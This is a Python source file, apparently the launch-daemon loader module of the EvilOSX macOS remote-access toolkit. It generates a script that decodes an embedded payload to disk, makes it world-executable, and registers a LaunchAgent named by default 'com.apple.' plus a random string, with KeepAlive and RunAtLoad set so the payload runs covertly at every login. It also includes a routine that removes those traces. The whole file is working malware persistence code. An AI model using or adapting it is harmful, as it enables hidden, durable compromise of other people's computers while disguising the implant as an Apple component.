from server.loaders.helpers import *
from textwrap import dedent
import base64


class Loader(LoaderABC):
    def get_info(self):
        return {
            "Author": ["Marten4n6"],
            "Description": "Makes payloads persistent via a launch daemon.",
            "References": [],
        }

    def setup(self):
        launch_agent_name = input(MESSAGE_INPUT + "Launch agent name [ENTER for com.apple.<RANDOM>]: ")

        if not launch_agent_name:
            launch_agent_name = "com.apple.{}".format(random_string())
            print(MESSAGE_INFO + "Using: {}".format(launch_agent_name))

        payload_filename = input(MESSAGE_INPUT + "Payload filename [ENTER for <RANDOM>]: ")

        if not payload_filename:
            payload_filename = random_string()
            print(MESSAGE_INFO + "Using: {}".format(payload_filename))

        return {
            "launch_daemon": {
                "launch_agent_name": launch_agent_name,
                "payload_filename": payload_filename
            }
        }

    def generate(self, loader_options, payload_options, payload):
        return dedent("""\
        import os
        import base64
        import subprocess
        from sys import exit
        from textwrap import dedent
        import logging

        # Logging
        logging.basicConfig(format="[%(levelname)s] %(funcName)s:%(lineno)s - %(message)s", level=logging.DEBUG)
        log = logging.getLogger("launch_daemon")

        PROGRAM_DIRECTORY = os.path.expanduser("{0}")
        LAUNCH_AGENT_NAME = "{1}"
        PAYLOAD_FILENAME = "{2}"


        log.debug("Program directory: " + PROGRAM_DIRECTORY)
        log.debug("Launch agent name: " + LAUNCH_AGENT_NAME)
        log.debug("Payload filename: " + PAYLOAD_FILENAME)


        def get_program_file():
            \"\"\":return The path to the encrypted payload.\"\"\"
            return os.path.join(PROGRAM_DIRECTORY, PAYLOAD_FILENAME)


        def get_launch_agent_directory():
            \"\"\":return The directory where the launch agent lives.\"\"\"
            return os.path.expanduser("~/Library/LaunchAgents")


        def get_launch_agent_file():
            \"\"\":return The path to the launch agent.\"\"\"
            return get_launch_agent_directory() + "/%s.plist" % LAUNCH_AGENT_NAME


        def run_command(command):
            \"\"\"Runs a system command and returns its response.\"\"\"
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            stdout, stderr = process.communicate()

            return stdout + stderr


        def setup_persistence():
            # Create directories
            run_command("mkdir -p " + PROGRAM_DIRECTORY)
            run_command("mkdir -p " + get_launch_agent_directory())

            # Create launch agent
            launch_agent_create = dedent(\"\"\"\\
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
                <plist version="1.0">
                <dict>
                   <key>KeepAlive</key>
                   <true/>
                   <key>Label</key>
                   <string>%s</string>
                   <key>ProgramArguments</key>
                   <array>
                       <string>%s</string>
                   </array>
                   <key>RunAtLoad</key>
                   <true/>
                </dict>
                </plist>
                \"\"\") % (LAUNCH_AGENT_NAME, get_program_file())

            with open(get_launch_agent_file(), "w") as output_file:
                output_file.write(launch_agent_create)

            with open(get_program_file(), "w") as output_file:
                output_file.write(base64.b64decode("{3}"))

            os.chmod(get_program_file(), 0777)

            # Load the launch agent
            output = run_command("launchctl load -w " + get_launch_agent_file())

            if output == "":
                if run_command("launchctl list | grep -w %s" % LAUNCH_AGENT_NAME):
                    log.info("Done!")
                    exit(0)
                else:
                    log.error("Failed to load launch agent.")
                    pass
            elif "already loaded" in output.lower():
                log.error("EvilOSX is already loaded.")
                exit(0)
            else:
                log.error("Unexpected output: " + output)
                pass

        setup_persistence()
        """.format(
            payload_options["program_directory"], loader_options["launch_agent_name"],
            loader_options["payload_filename"], str(base64.b64encode(payload.encode()), "utf-8")
        ))

    def remove_payload(self):
        return dedent("""\
        program_directory = LOADER_OPTIONS["program_directory"]
        launch_agent_name = LOADER_OPTIONS["launch_agent_name"]
        launch_agent_file = os.path.join(program_directory, launch_agent_name + ".plist")
            
        send_response(MESSAGE_ATTENTION + "Goodbye :(")
            
        run_command("rm -rf " + program_directory)
        run_command("rm -rf " + launch_agent_file)
        run_command("launchctl remove " + launch_agent_name)
        sys.exit(0)
        """)

    def update_payload(self, server_host, server_port):
        return dedent("""\
        """)
